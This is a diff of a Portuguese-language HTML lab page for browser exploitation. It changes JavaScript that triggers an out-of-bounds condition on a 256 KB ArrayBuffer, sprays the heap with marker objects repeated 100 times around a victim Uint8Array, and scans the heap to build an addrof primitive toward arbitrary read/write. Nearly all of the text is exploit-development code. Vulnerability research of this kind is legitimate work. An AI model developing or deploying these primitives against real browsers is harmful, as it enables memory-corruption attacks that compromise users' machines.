@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Laboratório Exploração Avançada - v2.5 (addrof real + debug)</title>
+  <title>Lab Exploração Avançada - addrof real (256KB + spray 100x)</title>
   <style>
     body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
     .container { background-color: #252526; padding: 15px; margin-bottom: 20px; border: 1px solid #444; border-radius: 5px; }
@@ -10,11 +10,11 @@
     button { background-color: #007acc; color: white; padding: 8px 12px; margin: 5px; border: none; border-radius: 3px; cursor: pointer; }
     button:hover { background-color: #005a9e; }
     .log-info { color: #6cf; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-leak { color: #FF9800; font-weight: bold; }
-    .log-good { color: #4CAF50; } .log-test { color: #fff; font-weight: bold; } .log-critical { color: #f0f; font-weight: bold; }
+    .log-good { color: #4CAF50; } .log-test { color: #fff; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Laboratório Exploração Avançada - v2.5 (addrof real + debug)</h1>
+  <h1>Lab Exploração Avançada - addrof real (256KB + spray 100x)</h1>
 
   <div class="container">
     <button onclick="triggerOOB_real()">1. Ativar OOB real</button>
@@ -84,7 +84,7 @@
     function triggerOOB_real() {
       log("Iniciando triggerOOB_real...", "test");
 
-      const buffer = new ArrayBuffer(1024);
+      const buffer = new ArrayBuffer(0x40000); // 256 KB
       const dv = new DataView(buffer);
       for (let i = 0; i < buffer.byteLength; i++) dv.setUint8(i, 0xAA);
       oob_array_buffer_real = buffer;
@@ -121,16 +121,22 @@
     }
 
     async function manualSetupAndAddrofTest() {
-      log("Criando spray de objetos com marcador...", "info");
+      log("Criando spray de objetos com marcador repetido 100x...", "info");
 
       const spray_size = 50;
       const middle = Math.floor(spray_size / 2);
-      let spray = [];
 
-      for (let i = 0; i < spray_size; i++) {
-        const marker_start = 0x41414141 + i;
-        const marker_end = 0x42424242 + i;
-        spray.push({ a: marker_start, b: (i === middle ? (victim_view_for_arb_rw = new Uint8Array(64)) : {}), c: marker_end });
+      for (let j = 0; j < 100; j++) {
+        for (let i = 0; i < spray_size; i++) {
+          const marker_start = 0x41414141 + i;
+          const marker_end = 0x42424242 + i;
+          const obj = {
+            a: marker_start,
+            b: (i === middle && j === 50 ? (victim_view_for_arb_rw = new Uint8Array(64)) : {}),
+            c: marker_end
+          };
+          window[`spray_${j}_${i}`] = obj;
+        }
       }
 
       window.victim_view_for_arb_rw_GLOBAL = victim_view_for_arb_rw;
@@ -142,7 +148,7 @@
 
     function testAddrof() {
       const base = oob_leaked_ptr_real.value;
-      const scan_limit = 0x4000; // 16 KB
+      const scan_limit = 0x8000; // 32KB
 
       log(`Iniciando varredura de heap a partir de ${base.toString(true)}...`, "info");
 
